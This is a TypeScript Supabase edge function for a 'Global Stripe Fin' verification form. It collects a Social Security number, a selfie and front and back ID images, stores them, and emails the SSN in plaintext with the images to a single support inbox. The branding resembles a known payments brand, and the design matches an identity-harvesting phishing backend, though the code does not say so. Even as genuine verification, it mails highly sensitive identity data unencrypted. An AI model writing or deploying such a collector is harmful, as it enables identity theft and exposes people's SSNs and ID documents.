import { createClient } from "@supabase/supabase-js";

const RESEND_ENDPOINT = "https://api.resend.com/emails";
const SUPPORT_EMAIL = "support@globalstripefin.com";
const STORAGE_BUCKET = "verification-submissions";
const MAX_FILE_BYTES = 4 * 1024 * 1024;
const MAX_REQUEST_BYTES = 15 * 1024 * 1024;
const ALLOWED_IMAGE_TYPES = new Set(["image/jpeg", "image/png", "image/webp"]);

const defaultAllowedOrigins = [
  "https://verify.globalstripefin.com",
  "http://localhost:5173",
  "http://127.0.0.1:5173",
];

function allowedOrigins() {
  const configured = Deno.env.get("VERIFICATION_ALLOWED_ORIGINS")
    ?.split(",")
    .map((origin) => origin.trim())
    .filter(Boolean);
  return new Set(configured?.length ? configured : defaultAllowedOrigins);
}

function corsHeaders(request: Request) {
  const origin = request.headers.get("origin");
  const allowedOrigin = origin && allowedOrigins().has(origin)
    ? origin
    : "https://verify.globalstripefin.com";

  return {
    "Access-Control-Allow-Origin": allowedOrigin,
    "Access-Control-Allow-Headers":
      "authorization, x-client-info, apikey, content-type",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Vary": "Origin",
  };
}

function json(request: Request, body: Record<string, unknown>, status = 200) {
  return Response.json(body, { status, headers: corsHeaders(request) });
}

function clean(value: FormDataEntryValue | null) {
  return typeof value === "string" ? value.trim() : "";
}

function escapeHtml(value: string) {
  return value
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function isEmail(value: string) {
  return value.length <= 254 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}

function extensionFor(file: File) {
  if (file.type === "image/png") return "png";
  if (file.type === "image/webp") return "webp";
  return "jpg";
}

function validateImage(value: FormDataEntryValue | null, label: string) {
  if (!(value instanceof File) || value.size === 0) {
    throw new Error(`${label} is required`);
  }
  if (!ALLOWED_IMAGE_TYPES.has(value.type)) {
    throw new Error(`${label} must be a JPG, PNG, or WebP image`);
  }
  if (value.size > MAX_FILE_BYTES) {
    throw new Error(`${label} must be 4 MB or smaller`);
  }
  return value;
}

function toBase64(bytes: Uint8Array) {
  let binary = "";
  const chunkSize = 0x8000;
  for (let index = 0; index < bytes.length; index += chunkSize) {
    binary += String.fromCharCode(...bytes.subarray(index, index + chunkSize));
  }
  return btoa(binary);
}

Deno.serve(async (request) => {
  if (request.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders(request) });
  }
  if (request.method !== "POST") {
    return json(request, { error: "Method not allowed" }, 405);
  }

  const origin = request.headers.get("origin");
  if (origin && !allowedOrigins().has(origin)) {
    return json(request, { error: "Origin is not allowed" }, 403);
  }

  const contentLength = Number(request.headers.get("content-length") ?? 0);
  if (contentLength > MAX_REQUEST_BYTES) {
    return json(request, { error: "The uploaded files are too large" }, 413);
  }

  const supabaseUrl = Deno.env.get("SUPABASE_URL");
  const serviceRoleKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  const resendApiKey = Deno.env.get("RESEND_API_KEY");
  const fromEmail = Deno.env.get("RESEND_FROM_EMAIL") ??
    `Global Stripe Fin <${SUPPORT_EMAIL}>`;

  if (!supabaseUrl || !serviceRoleKey || !resendApiKey) {
    console.error("Verification function secrets are incomplete");
    return json(request, { error: "Verification service is unavailable" }, 503);
  }

  const formData = await request.formData().catch(() => null);
  if (!formData) {
    return json(request, { error: "A valid verification form is required" }, 400);
  }

  // Honeypot submissions return a normal response without storing or emailing data.
  if (clean(formData.get("website"))) {
    return json(request, { delivered: true, reference: crypto.randomUUID() });
  }

  const ssn = clean(formData.get("ssn"));
  const emailOrReference = clean(formData.get("emailOrReference"));

  if (!/^[0-9-]{4,32}$/.test(ssn)) {
    return json(request, { error: "Enter a valid SSN" }, 400);
  }
  if (emailOrReference.length < 3 || emailOrReference.length > 160) {
    return json(
      request,
      { error: "Enter a valid email address or reference number" },
      400,
    );
  }

  let selfie: File;
  let idFront: File;
  let idBack: File;
  try {
    selfie = validateImage(formData.get("selfie"), "Selfie photo");
    idFront = validateImage(formData.get("idFront"), "ID card front");
    idBack = validateImage(formData.get("idBack"), "ID card back");
  } catch (error) {
    return json(
      request,
      { error: error instanceof Error ? error.message : "Invalid image" },
      400,
    );
  }

  const client = createClient(supabaseUrl, serviceRoleKey, {
    auth: { autoRefreshToken: false, persistSession: false },
  });
  const submissionId = crypto.randomUUID();
  const files = [
    { field: "selfie", filename: "selfie", file: selfie },
    { field: "idFront", filename: "id-card-front", file: idFront },
    { field: "idBack", filename: "id-card-back", file: idBack },
  ];
  const uploadedPaths: string[] = [];
  const attachments: Array<{ content: string; filename: string }> = [];

  try {
    for (const item of files) {
      const extension = extensionFor(item.file);
      const path = `${submissionId}/${item.filename}.${extension}`;
      const bytes = new Uint8Array(await item.file.arrayBuffer());
      const { error } = await client.storage.from(STORAGE_BUCKET).upload(
        path,
        bytes,
        { contentType: item.file.type, upsert: false },
      );
      if (error) throw error;

      uploadedPaths.push(path);
      attachments.push({
        content: toBase64(bytes),
        filename: `${item.filename}.${extension}`,
      });
    }

    const { error: insertError } = await client
      .from("verification_submissions")
      .insert({
        id: submissionId,
        ssn,
        email_or_reference: emailOrReference,
        selfie_path: uploadedPaths[0],
        id_front_path: uploadedPaths[1],
        id_back_path: uploadedPaths[2],
      });
    if (insertError) throw insertError;
  } catch (error) {
    if (uploadedPaths.length) {
      await client.storage.from(STORAGE_BUCKET).remove(uploadedPaths);
    }
    console.error("Verification submission could not be stored", error);
    return json(request, { error: "Your verification could not be submitted" }, 500);
  }

  const safeReference = escapeHtml(emailOrReference);
  const safeSsn = escapeHtml(ssn);
  const emailResponse = await fetch(RESEND_ENDPOINT, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${resendApiKey}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      from: fromEmail,
      to: [SUPPORT_EMAIL],
      ...(isEmail(emailOrReference) ? { reply_to: emailOrReference } : {}),
      subject: `[Verification submission] ${emailOrReference}`,
      text: [
        "New verification submission",
        `Submission ID: ${submissionId}`,
        `Email address / reference number: ${emailOrReference}`,
        `SSN: ${ssn}`,
        "",
        "The selfie and both sides of the ID card are attached.",
      ].join("\n"),
      html: `
        <h2>New verification submission</h2>
        <p><strong>Submission ID:</strong> ${submissionId}</p>
        <p><strong>Email address / reference number:</strong> ${safeReference}</p>
        <p><strong>SSN:</strong> ${safeSsn}</p>
        <hr />
        <p>The selfie and both sides of the ID card are attached.</p>
      `,
      attachments,
    }),
  });

  const providerBody = await emailResponse.json().catch(() => ({}));
  if (!emailResponse.ok) {
    console.error("Resend rejected verification email", emailResponse.status);
    await client
      .from("verification_submissions")
      .update({
        delivery_status: "failed",
        delivery_error: `Email provider returned ${emailResponse.status}`,
      })
      .eq("id", submissionId);
    return json(
      request,
      {
        error: "Your files were received, but the email could not be sent. Please try again.",
        reference: submissionId,
      },
      502,
    );
  }

  const { error: updateError } = await client
    .from("verification_submissions")
    .update({
      delivery_status: "sent",
      provider_email_id:
        typeof providerBody.id === "string" ? providerBody.id : null,
      sent_at: new Date().toISOString(),
    })
    .eq("id", submissionId);

  if (updateError) {
    console.error("Verification email sent but status update failed", updateError);
  }

  return json(request, { delivered: true, reference: submissionId });
});
